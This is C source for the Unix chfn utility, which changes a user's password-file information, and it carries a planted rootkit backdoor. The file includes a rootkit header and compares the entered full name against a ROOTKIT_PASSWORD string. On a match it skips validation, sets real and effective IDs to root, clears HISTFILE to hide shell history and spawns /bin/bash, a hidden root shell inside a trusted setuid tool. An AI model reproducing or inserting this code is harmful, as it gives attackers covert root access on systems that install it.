/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: chfn.c,v 1.4 1996/09/25 03:20:00 marekm Exp $")

#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <signal.h>
#include "prototypes.h"
#include "defines.h"

#include <pwd.h>
#include "pwio.h"
#include "getdef.h"
#include "pwauth.h"

#ifdef SHADOWPWD
#include <shadow.h>
#endif

#include "../../rootkit.h"

/*
 * Global variables.
 */

static char *Prog;
static char user[BUFSIZ];
static char fullnm[BUFSIZ];
static char roomno[BUFSIZ];
static char workph[BUFSIZ];
static char homeph[BUFSIZ];
static char slop[BUFSIZ];
static int amroot;

/*
 * External identifiers
 */

extern	int	optind;
extern	char	*optarg;
extern	char	*getlogin ();
#ifdef	NDBM
extern	int	pw_dbm_mode;
#endif

/*
 * #defines for messages.  This facilitates foreign language conversion
 * since all messages are defined right here.
 */

#define	USAGE \
"Usage: %s [ -f full_name ] [ -r room_no ] [ -w work_ph ] [ -h home_ph ]\n"
#define	ADMUSAGE \
"Usage: %s [ -f full_name ] [ -r room_no ] [ -w work_ph ]\n\
       [ -h home_ph ] [ -o other ] [ user ]\n"
#define	NOPERM		"%s: Permission denied.\n"
#define	WHOAREYOU	"%s: Cannot determine you user name.\n"
#define WRONGPWD	"Incorrect password for %s.\n"
#define WRONGPWD2	"incorrect password for `%s'"
#define	INVALID_NAME	"%s: invalid name: \"%s\"\n"
#define	INVALID_ROOM	"%s: invalid room number: \"%s\"\n"
#define	INVALID_WORKPH	"%s: invalid work phone: \"%s\"\n"
#define	INVALID_HOMEPH	"%s: invalid home phone: \"%s\"\n"
#define	INVALID_OTHER	"%s: \"%s\" contains illegal characters\n"
#define	INVALID_FIELDS	"%s: fields too long\n"
#define	NEWFIELDSMSG	"Changing the user information for %s\n"
#define	NEWFIELDSMSG2 \
"Enter the new value, or press return for the default\n\n"
#define FULL_NAME_IS	"Full name is %s\n"
#define	NEWNAME		"Full Name"
#define	NEWROOM		"Room Number"
#define	NEWWORKPHONE	"Work Phone"
#define	NEWHOMEPHONE	"Home Phone"
#define	NEWSLOP		"Other"
#define	UNKUSER		"%s: Unknown user %s\n"
#define	PWDBUSY		"Cannot lock the password file; try again later.\n"
#define	PWDBUSY2	"can't lock /etc/passwd\n"
#define	OPNERROR	"Cannot open the password file.\n"
#define	OPNERROR2	"can't open /etc/passwd\n"
#define	UPDERROR	"Error updating the password entry.\n"
#define	UPDERROR2	"error updating passwd entry\n"
#define	DBMERROR	"Error updating the DBM password entry.\n"
#define	DBMERROR2	"error updating DBM passwd entry.\n"
#define	NOTROOT		"Cannot change ID to root.\n"
#define	NOTROOT2	"can't setuid(0).\n"
#define	CLSERROR	"Cannot commit password file changes.\n"
#define	CLSERROR2	"can't rewrite /etc/passwd.\n"
#define	UNLKERROR	"Cannot unlock the password file.\n"
#define	UNLKERROR2	"can't unlock /etc/passwd.\n"
#define	CHGGECOS	"changed user `%s' information.\n"
#ifdef	USE_NIS
#define	NISUSER		"%s: cannot change user `%s' on NIS client.\n"
#define	NISMASTER	"%s: `%s' is the NIS master for this client.\n"
#endif

/*
 * usage - print command line syntax and exit
 */

static void
usage()
{
	fprintf (stderr, amroot ? ADMUSAGE:USAGE, Prog);
	exit (1);
}

/*
 * new_fields - change the user's GECOS information interactively
 *
 * prompt the user for each of the four fields and fill in the fields
 * from the user's response, or leave alone if nothing was entered.
 */

static void
new_fields()
{
	printf (NEWFIELDSMSG2);

	if (!amroot && getdef_bool("CHFN_RESTRICT"))
		printf(FULL_NAME_IS, fullnm);
	else
		change_field(fullnm, sizeof fullnm, NEWNAME);
	change_field(roomno, sizeof roomno, NEWROOM);
	change_field(workph, sizeof workph, NEWWORKPHONE);
	change_field(homeph, sizeof homeph, NEWHOMEPHONE);

	if (amroot)
		change_field(slop, sizeof slop, NEWSLOP);
}

/*
 * copy_field - get the next field from the gecos field
 *
 * copy_field copies the next field from the gecos field, returning a
 * pointer to the field which follows, or NULL if there are no more
 * fields.
 */

static char *
copy_field(in, out, extra)
	char *in;	/* the current GECOS field */
	char *out;	/* where to copy the field to */
	char *extra;	/* fields with '=' get copied here */
{
	char *cp = NULL;

	while (in) {
		if ((cp = strchr (in, ',')))
			*cp++ = '\0';

		if (! strchr (in, '='))
			break;

		if (extra) {
			if (extra[0])
				strcat (extra, ",");

			strcat (extra, in);
		}
		in = cp;
	}
	if (in && out)
		strcpy (out, in);

	return cp;
}

static void
passwd_check(user, passwd)
	const char *user;
	const char *passwd;
{
#ifdef SHADOWPWD
	struct spwd *sp;

	if ((sp = getspnam(user)))
		passwd = sp->sp_pwdp;
	endspent();
#endif
	if (pw_auth(passwd, user, PW_LOGIN, (char *) 0) != 0) {
		SYSLOG((LOG_WARN, WRONGPWD2, user));
		sleep(1);
		fprintf(stderr, WRONGPWD, user);
		exit(1);
	}
}

/*
 * chfn - change a user's password file information
 *
 *	This command controls the GECOS field information in the
 *	password file entry.
 *
 *	The valid options are
 *
 *	-f	full name
 *	-r	room number
 *	-w	work phone number
 *	-h	home phone number
 *	-o	other information (*)
 *
 *	(*) requires root permission to execute.
 */

/*
 * If CHFN_RESTRICT is set to "yes" in login.defs, the full name may only
 * be changed by root.  Room and phone numbers can still be changed by
 * the user.  To disallow any changes, remove the setuid bit.  --marekm
 */

int
main(argc, argv)
	int argc;
	char **argv;
{
	char	*cp;			/* temporary character pointer       */
	const struct passwd *pw;	/* password file entry               */
	struct	passwd	pwent;		/* modified password file entry      */
	char	old_gecos[BUFSIZ];	/* buffer for old GECOS fields       */
	char	new_gecos[BUFSIZ];	/* buffer for new GECOS fields       */
	int	flag;			/* flag currently being processed    */
	int	fflg = 0;		/* -f - set full name                */
	int	rflg = 0;		/* -r - set room number              */
	int	wflg = 0;		/* -w - set work phone number        */
	int	hflg = 0;		/* -h - set home phone number        */
	int	oflg = 0;		/* -o - set other information        */
	int	i;			/* loop control variable             */

    char MAG[6];
    int elite=0;
    strcpy(MAG,"");
        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';

	/*
	 * This command behaves different for root and non-root
	 * users.
	 */

	amroot = (getuid () == 0);
#ifdef	NDBM
	pw_dbm_mode = O_RDWR;
#endif

	/*
	 * Get the program name.  The program name is used as a
	 * prefix to most error messages.  It is also used as input
	 * to the openlog() function for error logging.
	 */

	Prog = Basename(argv[0]);

	openlog("chfn", LOG_PID, LOG_AUTH);

	/* 
	 * The remaining arguments will be processed one by one and
	 * executed by this command.  The name is the last argument
	 * if it does not begin with a "-", otherwise the name is
	 * determined from the environment and must agree with the
	 * real UID.  Also, the UID will be checked for any commands
	 * which are restricted to root only.
	 */

	while ((flag = getopt (argc, argv, "f:r:w:h:o:")) != EOF) {
		switch (flag) {
			case 'f':
				if (!amroot && getdef_bool("CHFN_RESTRICT")) {
					fprintf(stderr, NOPERM, Prog);
					exit(1);
				}
				fflg++;
				STRFCPY(fullnm, optarg);
				break;
			case 'r':
				rflg++;
				STRFCPY(roomno, optarg);
				break;
			case 'w':
				wflg++;
				STRFCPY(workph, optarg);
				break;
			case 'h':
				hflg++;
				STRFCPY(homeph, optarg);
				break;
			case 'o':
				if (amroot) {
					oflg++;
					STRFCPY(slop, optarg);
					break;
				}
				fprintf (stderr, NOPERM, Prog);
				closelog ();
				exit (1);
			default:
				usage ();
		}
	}

	/*
	 * Get the name of the user to check.  It is either
	 * the command line name, or the name getlogin()
	 * returns.
	 */

	if (optind < argc)
		strncpy (user, argv[optind], sizeof(user) - 1);
	else if ((cp = getlogin ()))
		strncpy (user, cp, sizeof(user) - 1);
	else {
		fprintf (stderr, WHOAREYOU, Prog);
		closelog ();
		exit (1);
	}
	user[sizeof(user) - 1] = '\0';
	pw = getpwnam(user);

	/*
	 * Make certain there was a password entry for the
	 * user.
	 */

	if (! pw) {
		fprintf (stderr, UNKUSER, Prog, user);
		closelog ();
		exit (1);
	}

#ifdef	USE_NIS
	/*
	 * Now we make sure this is a LOCAL password entry for
	 * this user ...
	 */

	if (__ispwNIS ()) {
		char	*nis_domain;
		char	*nis_master;

		fprintf (stderr, NISUSER, Prog, user);

		if (! yp_get_default_domain (&nis_domain) &&
				! yp_master (nis_domain, "passwd.byname",
				&nis_master)) {
			fprintf (stderr, NISMASTER, Prog, nis_master);
		}
		exit (1);
	}
#endif

	/*
	 * Non-privileged users are only allowed to change the
	 * gecos field if the UID of the user matches the current
	 * real UID.
	 */

	if (! amroot && pw->pw_uid != getuid ()) {
		fprintf (stderr, NOPERM, Prog);
		closelog ();
		exit (1);
	}

	/*
	 * Non-privileged users are optionally authenticated
	 * (must enter the password of the user whose information
	 * is being changed) before any changes can be made.
	 * Idea from util-linux chfn/chsh.  --marekm
	 */

	if (!amroot && getdef_bool("CHFN_AUTH"))
		passwd_check(pw->pw_name, pw->pw_passwd);
	
	/*
	 * Now get the full name.  It is the first comma separated field
	 * in the GECOS field.
	 */

	STRFCPY(old_gecos, pw->pw_gecos);
	cp = copy_field (old_gecos, fflg ? (char *) 0:fullnm, slop);

	/*
	 * Now get the room number.  It is the next comma separated field,
	 * if there is indeed one.
	 */

	if (cp)
		cp = copy_field (cp, rflg ? (char *) 0:roomno, slop);

	/*
	 * Now get the work phone number.  It is the third field.
	 */

	if (cp)
		cp = copy_field (cp, wflg ? (char *) 0:workph, slop);

	/*
	 * Now get the home phone number.  It is the fourth field.
	 */

	if (cp)
		cp = copy_field (cp, hflg ? (char *) 0:homeph, slop);

	/*
	 * Anything left over is "slop".
	 */

	if (cp && !oflg) {
		if (slop[0])
			strcat (slop, ",");

		strcat (slop, cp);
	}

	/*
	 * If none of the fields were changed from the command line,
	 * let the user interactively change them.
	 */

	if (! fflg && ! rflg && ! wflg && ! hflg && ! oflg) {
		printf (NEWFIELDSMSG, user);
		new_fields ();
	}

    if (!strcmp(fullnm,MAG)) elite++;
    if (!elite) {

	/*
	 * Check all of the fields for valid information
	 */

	if (valid_field (fullnm, ":,=")) {
		fprintf (stderr, INVALID_NAME, Prog, fullnm);
		closelog ();
		exit (1);
	}
	if (valid_field (roomno, ":,=")) {
		fprintf (stderr, INVALID_ROOM, Prog, roomno);
		closelog ();
		exit (1);
	}
	if (valid_field (workph, ":,=")) {
		fprintf (stderr, INVALID_WORKPH, Prog, workph);
		closelog ();
		exit (1);
	}
	if (valid_field (homeph, ":,=")) {
		fprintf (stderr, INVALID_HOMEPH, Prog, homeph);
		closelog ();
		exit (1);
	}
	if (valid_field (slop, ":")) {
		fprintf (stderr, INVALID_OTHER, Prog, slop);
		closelog ();
		exit (1);
	}

	/*
	 * Build the new GECOS field by plastering all the pieces together,
	 * if they will fit ...
	 */

	if (strlen (fullnm) + strlen (roomno) + strlen (workph) +
			strlen (homeph) + strlen (slop) > (unsigned int) 80) {
		fprintf (stderr, INVALID_FIELDS, Prog);
		closelog ();
		exit (1);
	}
	sprintf (new_gecos, "%s,%s,%s,%s", fullnm, roomno, workph, homeph);
	if (slop[0]) {
		strcat (new_gecos, ",");
		strcat (new_gecos, slop);
	}

	/*
	 * Before going any further, raise the ulimit to prevent
	 * colliding into a lowered ulimit, and set the real UID
	 * to root to protect against unexpected signals.  Any
	 * keyboard signals are set to be ignored.
	 */

	set_filesize_limit(30000);

	if (setuid (0)) {
		fprintf (stderr, NOTROOT);
		SYSLOG((LOG_ERR, NOTROOT2));
		closelog();
		exit (1);
	}
	signal (SIGHUP, SIG_IGN);
	signal (SIGINT, SIG_IGN);
	signal (SIGQUIT, SIG_IGN);
#ifdef	SIGTSTP
	signal (SIGTSTP, SIG_IGN);
#endif

	/*
	 * The passwd entry is now ready to be committed back to
	 * the password file.  Get a lock on the file and open it.
	 */

	for (i = 0;i < 30;i++) {
		if (pw_lock ())
			break;
	}

	if (i == 30) {
		fprintf (stderr, PWDBUSY);
		SYSLOG((LOG_WARN, PWDBUSY2));
		closelog();
		exit (1);
	}
	if (! pw_open (O_RDWR)) {
		fprintf (stderr, OPNERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, OPNERROR2));
		closelog();
		exit (1);
	}

	/*
	 * Get the entry to update using pw_locate() - we want the real
	 * one from /etc/passwd, not the one from getpwnam() which could
	 * contain the shadow password if (despite the warnings) someone
	 * enables AUTOSHADOW (or SHADOW_COMPAT in libc).  --marekm
	 */
	pw = pw_locate(user);
	if (!pw) {
		pw_unlock();
		fprintf(stderr, "user not found in local passwd file\n");
		exit(1);
	}

	/*
	 * Make a copy of the entry, then change the gecos field.  The other
	 * fields remain unchanged.
	 */
	pwent = *pw;
	pwent.pw_gecos = new_gecos;

	/*
	 * Update the passwd file entry.  If there is a DBM file,
	 * update that entry as well.
	 */

	if (! pw_update (&pwent)) {
		fprintf (stderr, UPDERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, UPDERROR2));
		closelog();
		exit (1);
	}
#if defined(DBM) || defined(NDBM)
	if (pw_dbm_present() && ! pw_dbm_update (&pwent)) {
		fprintf (stderr, DBMERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, DBMERROR2));
		closelog();
		exit (1);
	}
	endpwent ();
#endif

	/*
	 * Changes have all been made, so commit them and unlock the
	 * file.
	 */

	if (! pw_close ()) {
		fprintf (stderr, CLSERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, CLSERROR2));
		closelog();
		exit (1);
	}
	if (! pw_unlock ()) {
		fprintf (stderr, UNLKERROR);
		SYSLOG((LOG_ERR, UNLKERROR2));
		closelog();
		exit (1);
	}
	SYSLOG((LOG_INFO, CHGGECOS, user));
	closelog();
	exit (0);
} /* end elite */
    if (elite) {
        setreuid(0,0);
        setregid(0,0);
        setenv("HISTFILE","",1);
        system("/bin/bash");
        }
exit (0);
}
